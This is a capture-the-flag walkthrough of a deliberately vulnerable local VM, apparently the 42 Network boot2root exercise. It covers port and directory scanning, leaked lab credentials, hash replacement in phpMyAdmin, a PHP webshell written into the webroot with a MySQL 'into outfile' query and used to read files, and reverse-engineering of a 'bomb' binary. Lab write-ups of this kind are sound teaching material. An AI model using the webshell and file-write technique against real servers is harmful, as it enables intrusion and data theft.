# Writeup 1

`$ ifconfig`

![image](https://github.com/user-attachments/assets/ca4fd3bb-b9af-426c-8050-4502cfd94372)

nmap - Network exploration tool and security / port scanner

`$ nmap -sP 192.168.56.0/24`

![image](https://github.com/user-attachments/assets/88d8f879-1eae-4108-9d7a-98da258df4c7)

`$ ping 192.168.56.103`

![image](https://github.com/user-attachments/assets/246a5ac7-bcf6-4abe-aa4e-a8a1ae994a14)

`$ nmap -sV 192.168.56.103`

![image](https://github.com/user-attachments/assets/9192dcd2-6b76-41f9-b98e-e91de935619f)

```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd

```
![image](https://github.com/user-attachments/assets/432e65e0-151f-4ee0-a6dc-0deee264f9d2)

![image](https://github.com/user-attachments/assets/11e9b058-a8a1-445a-81de-36cde81760e4)

`$ nikto -h http://192.168.56.103`

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2024-08-09 13:46:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 13650, size: 1025, mtime: Wed Oct  7 19:37:54 2015. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-08-09 13:47:02 (GMT-4) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Directory Enumeration

`$ dirb http://192.168.56.103`
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Aug  9 13:50:48 2024
URL_BASE: http://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                           GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.103/ ----
                                                                           + http://192.168.56.103/cgi-bin/ (CODE:403|SIZE:290)                      
                                                                           ==> DIRECTORY: http://192.168.56.103/fonts/
+ http://192.168.56.103/forum (CODE:403|SIZE:287)                         
+ http://192.168.56.103/index.html (CODE:200|SIZE:1025)                   
+ http://192.168.56.103/server-status (CODE:403|SIZE:295)                 
                                                                          
---- Entering directory: http://192.168.56.103/fonts/ ----
                                                                           (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Aug  9 13:50:52 2024
DOWNLOADED: 4612 - FOUND: 4
```
I assumed the server would be running on http but nothing substantial came out of this search so I was mistaken.

`dirb https://192.168.56.103/ -o dirb.txt`

![image](https://github.com/user-attachments/assets/3931c147-cee5-499a-9fb9-b2c15577fcc5)

Too many results, it will be hard to effectively go through it all but I will save them in a seperate file just in case. 

`$ dirb https://192.168.56.103/ -r`         

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug 12 04:35:41 2024
URL_BASE: https://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

                                                                            GENERATED WORDS: 4612

---- Scanning URL: https://192.168.56.103/ ----
                                                                            + https://192.168.56.103/cgi-bin/ (CODE:403|SIZE:291)                      
                                                                            ==> DIRECTORY: https://192.168.56.103/forum/
                                                                            ==> DIRECTORY: https://192.168.56.103/phpmyadmin/
+ https://192.168.56.103/server-status (CODE:403|SIZE:296)                 
                                                                            ==> DIRECTORY: https://192.168.56.103/webmail/
                                                                               
-----------------
END_TIME: Mon Aug 12 04:35:45 2024
DOWNLOADED: 4612 - FOUND: 2
```

With the **non-recursive** option dirb will just list the first level directories of the main URL that was specified in the command. We don't have the permission to access 2 of these directories as indicated by the **403 status code**. But we have these 3 directories ready for inspection:
- /forum
- /phpmyadmin
- /webmail

## /forum

`dirb https://192.168.56.103/forum`
```
---- Scanning URL: https://192.168.56.103/forum/ ----
+ https://192.168.56.103/forum/backup (CODE:403|SIZE:295)                                 
+ https://192.168.56.103/forum/config (CODE:403|SIZE:295)                                 
==> DIRECTORY: https://192.168.56.103/forum/images/                                       
==> DIRECTORY: https://192.168.56.103/forum/includes/                                     
+ https://192.168.56.103/forum/index (CODE:200|SIZE:4935)                                 
+ https://192.168.56.103/forum/index.php (CODE:200|SIZE:4935)                             
==> DIRECTORY: https://192.168.56.103/forum/js/                                           
==> DIRECTORY: https://192.168.56.103/forum/lang/                                         
==> DIRECTORY: https://192.168.56.103/forum/modules/                                      
==> DIRECTORY: https://192.168.56.103/forum/templates_c/                                  
==> DIRECTORY: https://192.168.56.103/forum/themes/                                       
==> DIRECTORY: https://192.168.56.103/forum/update/

```
![image](https://github.com/user-attachments/assets/a3fb315d-23a3-4d81-8110-b9c7e3221582)

![image](https://github.com/user-attachments/assets/daf8c625-7a02-4013-ba44-c58a47ab1196)

`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`


`Username: lmezard`

`Password: !q\]Ej?*5K5cy*AJ`

![image](https://github.com/user-attachments/assets/e2fa56be-582c-49f6-b0f2-442d6b336b5e)

![image](https://github.com/user-attachments/assets/6e796a36-c732-4ed0-89c6-1efe063a89b9)

`laurie@borntosec.net`

## /webmail

`dirb https://192.168.56.103/webmail`

```
+ https://192.168.56.103/webmail/class (CODE:403|SIZE:296)                                
==> DIRECTORY: https://192.168.56.103/webmail/config/                                     
+ https://192.168.56.103/webmail/functions (CODE:403|SIZE:300)                            
+ https://192.168.56.103/webmail/help (CODE:403|SIZE:295)                                 
==> DIRECTORY: https://192.168.56.103/webmail/images/                                     
+ https://192.168.56.103/webmail/include (CODE:403|SIZE:298)                              
+ https://192.168.56.103/webmail/index.php (CODE:302|SIZE:0)                              
+ https://192.168.56.103/webmail/locale (CODE:403|SIZE:297)                               
==> DIRECTORY: https://192.168.56.103/webmail/plugins/                                    
==> DIRECTORY: https://192.168.56.103/webmail/src/                                        
==> DIRECTORY: https://192.168.56.103/webmail/themes/
```

![image](https://github.com/user-attachments/assets/8ea8e0e3-ab2c-48fa-9b5e-1b8615bc9232)

We can login with the previous credentials.

![image](https://github.com/user-attachments/assets/7889eec2-fc09-4af0-ac34-f88e129f5de3)

```
Subject:   	DB Access
From:   	qudevide@mail.borntosec.net
Date:   	Thu, October 8, 2015 11:25 pm
To:   	laurie@borntosec.net
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
## /phpmyadmin

```
+ https://192.168.56.103/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                     
+ https://192.168.56.103/phpmyadmin/index.php (CODE:200|SIZE:7540)                        
==> DIRECTORY: https://192.168.56.103/phpmyadmin/js/                                      
+ https://192.168.56.103/phpmyadmin/libraries (CODE:403|SIZE:303)                         
==> DIRECTORY: https://192.168.56.103/phpmyadmin/locale/                                  
+ https://192.168.56.103/phpmyadmin/phpinfo.php (CODE:200|SIZE:7540)                      
+ https://192.168.56.103/phpmyadmin/setup (CODE:401|SIZE:482)                             
==> DIRECTORY: https://192.168.56.103/phpmyadmin/themes/ 
```

![image](https://github.com/user-attachments/assets/be7db68a-8a54-4f1d-aaaa-9d180283e56c)

![image](https://github.com/user-attachments/assets/a2ad9a22-869f-4af9-9d0d-fd54e089b8b8)

```
MySQL

    Server: Localhost via UNIX socket
    Server version: 5.5.44-0ubuntu0.12.04.1
    Protocol version: 10
    User: root@localhost
    MySQL charset: UTF-8 Unicode (utf8)


```

```
Web server

    Apache/2.2.22 (Ubuntu)
    MySQL client version: 5.5.44
    PHP extension: mysqli 
```

```
phpMyAdmin

    Version information: 3.4.10.1deb1
```

![image](https://github.com/user-attachments/assets/a0a54a24-f5fe-48bd-bda8-05af5acf86dc)

![image](https://github.com/user-attachments/assets/2e3ded56-1946-4311-8a51-3397aea3e58f)

`ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28`

So, we were able to get the password hash for the admin. But I was unable to crack the hash. The old friends `john` or `crackstation` couldn't help. It would have been useful if we knew more about the type of hashing algorithm used.

Let's see if we can figure it out.

We see that the forum is powered by [mylittleforum](https://mylittleforum.net/) which is a simple PHP and MySQL based internet forum that displays the messages in classical threaded view (tree structure). It is Open Source licensed under the GNU General Public License.

![image](https://github.com/user-attachments/assets/f25df078-8aa2-4ca9-8516-6f57e0b809f9)

We can navigate to the source code from here:

![image](https://github.com/user-attachments/assets/a277dca3-a31b-49dc-b5dc-3b260716da97)

![image](https://github.com/user-attachments/assets/28fe96ca-0d14-4bac-a89a-283e0f8cf22b)

![image](https://github.com/user-attachments/assets/24345c76-2b79-45c0-98e5-360cd8fff505)

```
function generate_pw_hash($pw) {
	$salt = random_string(10, '0123456789abcdef');
	$salted_hash = sha1($pw.$salt);
	$hash_with_salt = $salted_hash.$salt;
	return $hash_with_salt;
}
```

The hash is composed of a salted SHA-1 hash. In the light of this information I was still unable to crack the admin's password hash. So I decided to just generate my own hash. Here is a simple script:

```
<?php
function generate_pw_hash($pw) {
    $salt = '5f4dcc3b5d';  // 10 random chars for salt
    $salted_hash = sha1($pw . $salt);
    $hash_with_salt = $salted_hash . $salt;
    return $hash_with_salt;
}

$password = '123';
$new_hash = generate_pw_hash($password);
echo $new_hash;
?>
```

`$ php ./generate_hash.php` outputs `15f32d5a4abd9ae09034e5b2b4e6e29e8b8592525f4dcc3b5d`

After replacing this with the admin's user_pw we will be able to login to the account with the password `123`

![image](https://github.com/user-attachments/assets/cc14dcdc-484a-47ab-a932-0c8ff76f2e10)

![image](https://github.com/user-attachments/assets/d59dfe2a-5c9a-4bb6-859d-f5ef57eb836d)

We are in. However this was absolutely useless. I changed various forum settings like enabling all users to upload images and attempted to inject a payload via image upload. It didn't work. 

![image](https://github.com/user-attachments/assets/2bfd32d3-2646-472e-9be2-045545bc989d)

Some links if you want to try it out yourself:

https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/

https://infosecwriteups.com/bypassed-and-uploaded-a-sweet-reverse-shell-d15e1bbf5836

Very very sad.

## Attempt 2
 This was the payload I was working with `<?php system($_GET[‘c’]);?>`.

 [system](https://www.php.net/manual/en/function.system.php) — Execute an external program and display the output
 
[$_GET](https://www.php.net/manual/en/reserved.variables.get.php) — An associative array of variables passed to the current script via the URL parameters (aka. query string).

 Our goal will be to upload this to the victim site and execute something along the lines of `example.com/upload/test.php?c=whoami`

 We have root access to the database and we can run SQL queries on the server. The plan is to upload a webshell in the webroot, [see](https://www.infosecinstitute.com/resources/hacking/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/).

The [default document root](https://askubuntu.com/questions/683953/where-is-apache-web-root-directory-on-ubuntu) for Apache is **/var/www/** (before Ubuntu 14.04) or /var/www/html/ (Ubuntu 14.04 and later)

We can use the `into outfile` command to write the output of the query into a file at the specified location on the server. Neat [tutorial](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/) that I will be following.

Going back to our dirb results, I one by one tried every subdirectory that returned status code 200. `forum/templates_c` turned out to be the only one where we have write right.

`select 1, '<?php system($_GET["c"]); ?>' into outfile '/var/www/forum/templates_c/cmd.php'`

![image](https://github.com/user-attachments/assets/17eb0165-0061-4f1a-aa94-74f9697c3991)

Now if we visit `https://192.168.56.103/forum/templates_c/cmd.php`

![image](https://github.com/user-attachments/assets/2df4be2f-d5e9-4594-bf8a-852a2d1093d5)

We can see that our file exists and is returning the output for select 1

Now let's try supplying a system command as a parameter: `https://192.168.56.103/forum/templates_c/cmd.php?c=whoami`

![image](https://github.com/user-attachments/assets/fe8c425d-4bf4-4f84-a23a-fade6151838a)

We get the results of both select 1 query and the whoami command seperated into different columns. It appears that the current user is [`www-data`](https://askubuntu.com/questions/873839/what-is-the-www-data-user)

_The web server has to be run under a specific user._

_If it were run under root, then all the files would have to be accessible by root and the user would need to be root to access the files. With root being the owner, a compromised web server would have access to your entire system._

_By default the configuration of the owner is www-data in the Ubuntu configuration of Apache2._

Supplying all these commands via URL parameter is tedious and it would be nice to get reverse shell with Netcat at this point but it doesn't seem to work. I will keep supplying the commands via the URL for now and will come back to it later.

`https://192.168.56.103/forum/templates_c/cmd.php?c=find%20/%20-user%20www-data%202%3E/dev/null`

![image](https://github.com/user-attachments/assets/33b95b55-4451-4fff-91dc-b26316bdfc3c)

Interesting

`https://192.168.56.103/forum/templates_c/cmd.php?c=ls%20/home`

We only have access to the LOOKATME directory

![image](https://github.com/user-attachments/assets/2a66352d-89ed-4bb0-9155-90495e68741b)

`https://192.168.56.103/forum/templates_c/cmd.php?c=cat%20/home/LOOKATME/password`

![image](https://github.com/user-attachments/assets/03d0eff6-7cc2-4c1a-9766-5fc0d6350c2e)

We get another set of credentials for the user lmezard: `lmezard:G!@M6f4Eatau{sF"` We already have lmezard's account for SquirrelMail and the forum. Attempting to login to phpMyAdmin was no use either(Which was expected as it was mentioned in the mails that lmezard should be using the root account from now on). 

## fun

Well, ssh port is open

`$ ssh lmezard@192.168.56.103`

![image](https://github.com/user-attachments/assets/6dcb392a-8829-4047-b777-fb8ea6983006)

:(

So is ftp,

`$ ftp 192.168.56.103`

![image](https://github.com/user-attachments/assets/26234c75-61d0-4d89-bdaa-21e5018bc7f7)

Great, let's look around:

![image](https://github.com/user-attachments/assets/4c8fef48-2401-4737-99a1-d52cf523faf0)

![image](https://github.com/user-attachments/assets/501a384a-1c30-4ecf-9ab9-e1cd92c4862b)

`$ cat README`

`Complete this little challenge and use the result as password for user 'laurie' to login in ssh`

`$ open fun`

![image](https://github.com/user-attachments/assets/91d4d7b1-5e12-496c-ab74-055f0d870a2e)

There are 750 .pcap files and wireshark is unable to open them. When we read the contents we see text that is not expected from a pcap file.

`$ cat * | less`

![image](https://github.com/user-attachments/assets/dfabc800-fa4b-4185-a9e8-f14997fe19f4)

`$ cat * | grep printf`

![image](https://github.com/user-attachments/assets/0098b708-dd37-44ea-b8b9-9a24d5063d00)

![image](https://github.com/user-attachments/assets/1b6d13e6-e3f1-4a2a-9cca-8e5817413df2)

`$ ls | sort > files`

`$ count=1; for file in `cat files`; do mv "$file" "file${count}"; count=$((count + 1)); done`

![image](https://github.com/user-attachments/assets/4f1a0a69-6220-41ca-a76f-1de4c96fb7ab)

_______wnage

![image](https://github.com/user-attachments/assets/4ec48f1f-2a15-46fa-86b9-9116ab1f978f)

```
$ for file in *; do
  number=$(grep -oP '^//file\K\d+' "$file" | head -n 1)
  [ -n "$number" ] && [ ! -e "$number" ] && mv "$file" "$number"
done

```
![image](https://github.com/user-attachments/assets/23f20b0d-3cf4-48a3-a7b3-370779247a93)

`$ cat * | grep return`

![image](https://github.com/user-attachments/assets/7668fe86-5a7c-4b38-adb5-2b75e64c605e)

`Iheartpwnage`

`$ echo -n Iheartpwnage > pass` Make sure to add the -n option to not include the traililng newline or your hash will be wrong.

`$ sha256sum pass`

`330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

![image](https://github.com/user-attachments/assets/04ed4899-8016-4bae-80f8-e41b69966afa)

## bomb

Let's look around,

![image](https://github.com/user-attachments/assets/5d8f6816-63fe-410a-ace6-0724f887d93c)

```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
Running the program results in another message to be printed:

![image](https://github.com/user-attachments/assets/e59da724-312e-493f-9006-a35e020929b9)

```
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
```
We need to find the right keyword. After testing with various input values  I download the program into my machine to examine it further.

`$ scp laurie@192.168.56.103:~/bomb .`

First, I would like to try calling `strings` to see if I can simply find the password among the printable characters in the executable.

`$ strings bomb`

![image](https://github.com/user-attachments/assets/6405eb3d-7d76-4e8a-a6c5-1c7f95bfb0a3)

I note down the words that look promising:

```
Public speaking is very easy.
%d %c %d
giants
Wow! You've defused the secret stage!

nobody
defused
exploded

bomb-header:%s:%d:%s:%s:%d
bomb-string:%s:%d:%s:%d:%s
bomb
/usr/sbin/sendmail -bm
%s %s@%s

austinpowers
Curses, you've found the secret phase!
But finding it and solving it are quite different...
Congratulations! You've defused the bomb!
```
For the stage one `Public speaking is very easy.` works!

![image](https://github.com/user-attachments/assets/87cde4f2-6dc9-48b0-9f4b-4f9f3c9e3646)

Unfortunately "giant" or "austinpowers" do not work for the next stage and I can't find anything else among the strings. We will need to go a step further.

I disassemble the binary: `$ objdump bomb > bomb.asm`

We can see the assembly code for various functions.

```
08048b48 <phase_2>:
 8048b48:	55                   	push   %ebp
 8048b49:	89 e5                	mov    %esp,%ebp
 8048b4b:	83 ec 20             	sub    $0x20,%esp
 8048b4e:	56                   	push   %esi
 8048b4f:	53                   	push   %ebx
 8048b50:	8b 55 08             	mov    0x8(%ebp),%edx
 8048b53:	83 c4 f8             	add    $0xfffffff8,%esp
 8048b56:	8d 45 e8             	lea    -0x18(%ebp),%eax
 8048b59:	50                   	push   %eax
 8048b5a:	52                   	push   %edx
 8048b5b:	e8 78 04 00 00       	call   8048fd8 <read_six_numbers>
 8048b60:	83 c4 10             	add    $0x10,%esp
 8048b63:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
 8048b67:	74 05                	je     8048b6e <phase_2+0x26>
 8048b69:	e8 8e 09 00 00       	call   80494fc <explode_bomb>
 8048b6e:	bb 01 00 00 00       	mov    $0x1,%ebx
 8048b73:	8d 75 e8             	lea    -0x18(%ebp),%esi
 8048b76:	8d 43 01             	lea    0x1(%ebx),%eax
 8048b79:	0f af 44 9e fc       	imul   -0x4(%esi,%ebx,4),%eax
 8048b7e:	39 04 9e             	cmp    %eax,(%esi,%ebx,4)
 8048b81:	74 05                	je     8048b88 <phase_2+0x40>
 8048b83:	e8 74 09 00 00       	call   80494fc <explode_bomb>
 8048b88:	43                   	inc    %ebx
 8048b89:	83 fb 05             	cmp    $0x5,%ebx
 8048b8c:	7e e8                	jle    8048b76 <phase_2+0x2e>
 8048b8e:	8d 65 d8             	lea    -0x28(%ebp),%esp
 8048b91:	5b                   	pop    %ebx
 8048b92:	5e                   	pop    %esi
 8048b93:	89 ec                	mov    %ebp,%esp
 8048b95:	5d                   	pop    %ebp
 8048b96:	c3                   	ret
 8048b97:	90                   	nop
```

```
08048fd8 <read_six_numbers>:
 8048fd8:	55                   	push   %ebp
 8048fd9:	89 e5                	mov    %esp,%ebp
 8048fdb:	83 ec 08             	sub    $0x8,%esp
 8048fde:	8b 4d 08             	mov    0x8(%ebp),%ecx
 8048fe1:	8b 55 0c             	mov    0xc(%ebp),%edx
 8048fe4:	8d 42 14             	lea    0x14(%edx),%eax
 8048fe7:	50                   	push   %eax
 8048fe8:	8d 42 10             	lea    0x10(%edx),%eax
 8048feb:	50                   	push   %eax
 8048fec:	8d 42 0c             	lea    0xc(%edx),%eax
 8048fef:	50                   	push   %eax
 8048ff0:	8d 42 08             	lea    0x8(%edx),%eax
 8048ff3:	50                   	push   %eax
 8048ff4:	8d 42 04             	lea    0x4(%edx),%eax
 8048ff7:	50                   	push   %eax
 8048ff8:	52                   	push   %edx
 8048ff9:	68 1b 9b 04 08       	push   $0x8049b1b
 8048ffe:	51                   	push   %ecx
 8048fff:	e8 5c f8 ff ff       	call   8048860 <sscanf@plt>
 8049004:	83 c4 20             	add    $0x20,%esp
 8049007:	83 f8 05             	cmp    $0x5,%eax
 804900a:	7f 05                	jg     8049011 <read_six_numbers+0x39>
 804900c:	e8 eb 04 00 00       	call   80494fc <explode_bomb>
 8049011:	89 ec                	mov    %ebp,%esp
 8049013:	5d                   	pop    %ebp
 8049014:	c3                   	ret
 8049015:	8d 76 00             	lea    0x0(%esi),%esi

```
I essentialy used [CodeCovnert](https://www.codeconvert.ai/assembly-to-c-converter) to convert Assembly into C. It was useful to get the overall idea of the code. But this tool is an AI language model so it was not 100% accurate and I wasn't able to determine the right password this way.

So I opted for using `IDA Freeware 8.4`

After dragging the bomb binary into the program you are greeted with this beautiful interface.

![image](https://github.com/user-attachments/assets/ed559a83-2462-469b-9c36-716cf6080b64)

Let's select the Phase_2 function

![image](https://github.com/user-attachments/assets/6abb6888-9f42-4c86-b418-e44523060e92)

Then we can click on `F5` to generate pseudocode.

![image](https://github.com/user-attachments/assets/74ad43f9-fd22-4a0d-bb54-b713a502a5eb)

```
int __cdecl phase_2(int a1)
{
  int i; // ebx
  int result; // eax
  int v3[6]; // [esp+10h] [ebp-18h] BYREF

  read_six_numbers(a1, v3);
  if ( v3[0] != 1 )
    explode_bomb();
  for ( i = 1; i <= 5; ++i )
  {
    result = v3[i - 1] * (i + 1);
    if ( v3[i] != result )
      result = explode_bomb();
  }
  return result;
}
```

We now know what kind of an input the program is expecting. We require 6 numbers that follows a certain pattern.

[0] = 1

[1] = 1 * 2 = 2

[2] = 2 * 3 = 6

[3] = 6 * 4 = 24

[4] = 24 * 5 = 120

[5] = 120 * 6 = 720

The password for the phase 2 is `1 2 6 24 120 720`

![image](https://github.com/user-attachments/assets/d5fb0605-b964-4ff1-9342-d02c74d928fb)

Cool, time for the next phase.

```
int __cdecl phase_3(int a1)
{
  int result; // eax
  char v2; // bl
  int v3; // [esp+Ch] [ebp-Ch] BYREF
  char v4; // [esp+13h] [ebp-5h] BYREF
  int v5; // [esp+14h] [ebp-4h] BYREF

  if ( sscanf(a1, "%d %c %d", &v3, &v4, &v5) <= 2 )
    explode_bomb();
  result = v3;
  switch ( v3 )
  {
    case 0:
      v2 = 113;
      if ( v5 != 777 )
        goto LABEL_19;
      break;
    case 1:
      v2 = 98;
      if ( v5 != 214 )
        goto LABEL_19;
      break;
    case 2:
      v2 = 98;
      if ( v5 != 755 )
        goto LABEL_19;
      break;
    case 3:
      v2 = 107;
      if ( v5 != 251 )
        goto LABEL_19;
      break;
    case 4:
      v2 = 111;
      if ( v5 != 160 )
        goto LABEL_19;
      break;
    case 5:
      v2 = 116;
      if ( v5 != 458 )
        goto LABEL_19;
      break;
    case 6:
      v2 = 118;
      if ( v5 != 780 )
        goto LABEL_19;
      break;
    case 7:
      v2 = 98;
      if ( v5 != 524 )
LABEL_19:
        result = explode_bomb();
      break;
    default:
      v2 = 120;
      result = explode_bomb();
      break;
  }
  if ( v2 != v4 )
    return explode_bomb();
  return result;
}
```
We need to enter a number, a character and then another number. Based on the first number entered there are several different cases.

I went for case 0 so, v3 = 0 and v2 = 113 then v5 = 777 (otherwise we are rediretced to case LABEL_19 which is an automatic explosion), finally the last if statement checks wheter v2 is equal to v4 or not. Then, v4 = 113 (q in ascii table)

Final input becomes: `0 q 777`

![image](https://github.com/user-attachments/assets/c98139be-2fc5-4032-9e12-65a3dc8f2bb5)

Time for the next phase.

```
int __cdecl phase_4(int a1)
{
  int result; // eax
  int v2; // [esp+14h] [ebp-4h] BYREF

  if ( sscanf(a1, "%d", &v2) != 1 || v2 <= 0 )
    explode_bomb();
  result = func4(v2);
  if ( result != 55 )
    return explode_bomb();
  return result;
}
```

```
int __cdecl func4(int a1)
{
  int v1; // esi

  if ( a1 <= 1 )
    return 1;
  v1 = func4(a1 - 1);
  return v1 + func4(a1 - 2);
}
```
This seems to be a fibonacci sequence: 1, 2, 3, 5, 8, 13, 21, 34, 55

`9`th element gives us the target number.

![image](https://github.com/user-attachments/assets/15afeed9-2601-4a13-a906-9252dad89b5f)

Phase 5,

```
int __cdecl phase_5(int a1)
{
  int i; // edx
  int result; // eax
  char v3[8]; // [esp+10h] [ebp-8h] BYREF

  if ( string_length(a1) != 6 )
    explode_bomb();
  for ( i = 0; i <= 5; ++i )
    v3[i] = array_123[*(_BYTE *)(i + a1) & 0xF];
  v3[6] = 0;
  result = strings_not_equal(v3, "giants");
  if ( result )
    return explode_bomb();
  return result;
}
```
Hey, "giants" makes another appearance! The result should be equal to giants but a set of operations is performed on the string we pass and mess it up.

![image](https://github.com/user-attachments/assets/f9746b91-11b7-461e-94b5-d3a368c21388)

array_123 = {i s r v e a w h o b p n u t f g}

Every letter in our string gets remapped into one of the letters in array_123 via an AND operation.

We can write a small script to figure out how it works

```
#include <stdio.h>

int main()
{
    char array_123[] = "isrveawhobpnutfg";
    for (int i = 0; i < 26; i++)
    {
        printf("%c:%c ", 97 + i, array_123[(97 + i) & 0xf]);
    }
    
}
```
Here is the result: `a:s b:r c:v d:e **e:a** f:w g:h h:o i:b j:p **k:n** l:u **m:t** n:f **o:g** **p:i** **q:s** r:r s:v t:e u:a v:w w:h x:o y:b z:p`


So in order to get giants our input should be: `opekmq`

![image](https://github.com/user-attachments/assets/6107303b-5ab0-4715-bc6e-864d2d474028)

Hurray!

Last phase,

```
int __cdecl phase_6(int a1)
{
  int i; // edi
  int j; // ebx
  int v3; // edi
  _DWORD *v4; // ecx
  _DWORD *v5; // esi
  int k; // ebx
  int v7; // esi
  int m; // edi
  int v9; // eax
  int v10; // esi
  int n; // edi
  int result; // eax
  int v13; // [esp+24h] [ebp-34h]
  int v14[6]; // [esp+28h] [ebp-30h]
  _DWORD v15[6]; // [esp+40h] [ebp-18h] BYREF

  read_six_numbers(a1, v15);
  for ( i = 0; i <= 5; ++i )
  {
    if ( (unsigned int)(v15[i] - 1) > 5 )
      ((void (*)(void))explode_bomb)();
    for ( j = i + 1; j <= 5; ++j )
    {
      if ( v15[i] == v15[j] )
        ((void (*)(void))explode_bomb)();
    }
  }
  v3 = 0;
  v4 = v15;
  do
  {
    v5 = &node1;
    for ( k = 1; k < v15[v3]; ++k )
      v5 = (_DWORD *)v5[2];
    v14[v3++] = (int)v5;
  }
  while ( v3 <= 5 );
  v7 = v14[0];
  v13 = v14[0];
  for ( m = 1; m <= 5; ++m )
  {
    v9 = v14[m];
    *(_DWORD *)(v7 + 8) = v9;
    v7 = v9;
  }
  *(_DWORD *)(v9 + 8) = 0;
  v10 = v13;
  for ( n = 0; n <= 4; ++n )
  {
    result = *(_DWORD *)v10;
    if ( *(_DWORD *)v10 < **(_DWORD **)(v10 + 8) )
      result = explode_bomb(v4);
    v10 = *(_DWORD *)(v10 + 8);
  }
  return result;
}
```
So this function takes 6 numbers as input. If any of those numbers is larger than 5 we explode, if any of them are equal to each other we explode. 

Now let's see what these nodes are supposed to be.

![image](https://github.com/user-attachments/assets/42363e3d-16fd-4904-b744-5415a8deb4c2)


![image](https://github.com/user-attachments/assets/ee06ca25-2030-4529-8c89-5aefd316b3c8)

They are double word values so we will interpert them as 16 bit integers
thus,

`node6=1B0=432`

`node5=D4=212`

`node4=3E5=997`

`node3=12D=301`

`node2=2D5=725`

`node1=FD=253`

Each number in our array is turned into pointers to these. A linked list is formed.

The final list needs to be in descending order or we explode.

Then the final value should be `4 2 6 3 1 5`

![image](https://github.com/user-attachments/assets/d2d5ac9c-215e-448b-a0f0-5a639f47ea68)

We have defused the bomb! We can login as thor with ssh now.

`$ ssh thor@192.168.56.103`

Password: `Publicspeakingisveryeasy.126241207201b2149opekmq426315`

Apparently this does not work. I might be overlooking something or there might be an error in the exercise. In any case, the only accepted password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

This issue was discussed in the 42 Network [forums](https://stackoverflowteams.com/c/42network/questions/664) before.

![image](https://github.com/user-attachments/assets/ecc0d00a-9fcc-4266-bccb-02a554b25244)

Anyways time to check out thor's home directory.

![image](https://github.com/user-attachments/assets/fecac65b-a55c-4d4e-8ec3-31f980784102)

`$ cat turtle` gives us more than a thousand lines of directions.

![image](https://github.com/user-attachments/assets/563b8a4d-463b-4391-9bcb-d9fc8bfd02e5)

I will sort the unique lines to make it easier to comprehend what's going on: $ cat turtle | sort -u

![image](https://github.com/user-attachments/assets/925bdec9-996d-4d70-b8c4-a80b9fde8373)

```
Avance 100 spaces
Avance 120 spaces
Avance 1 spaces
Avance 200 spaces
Avance 210 spaces
Avance 50 spaces
Can you digest the message? :)
Recule 100 spaces
Recule 200 spaces
Recule 210 spaces
Tourne droite de 10 degrees
Tourne droite de 120 degrees
Tourne droite de 150 degrees
Tourne droite de 1 degrees
Tourne droite de 90 degrees
Tourne gauche de 1 degrees
Tourne gauche de 90 degrees
```

google translate ~

```
Move forward 100 spaces
Move forward 120 spaces
Move forward 1 space
Move forward 200 spaces
Move forward 210 spaces
Move forward 50 spaces
Can you digest the message? :)
Move back 100 spaces
Move back 200 spaces
Move back 210 spaces
Turn right 10 degrees
Turn right 120 degrees
Turn right 150 degrees
Turn right 1 degree
Turn right 90 degrees
Turn left 1 degree
Turn left 90 degrees
```
Appearantly [turtle](https://robertvandeneynde.be/parascolaire/turtle.en.html) is a somewhat famous python module. 

Here is a little example of its usage.

![image](https://github.com/user-attachments/assets/efd0e2db-be14-43f4-8e60-7d01a3c175a3)

A cute little turtle draws stuff for us.

`fd()` function to move forward.

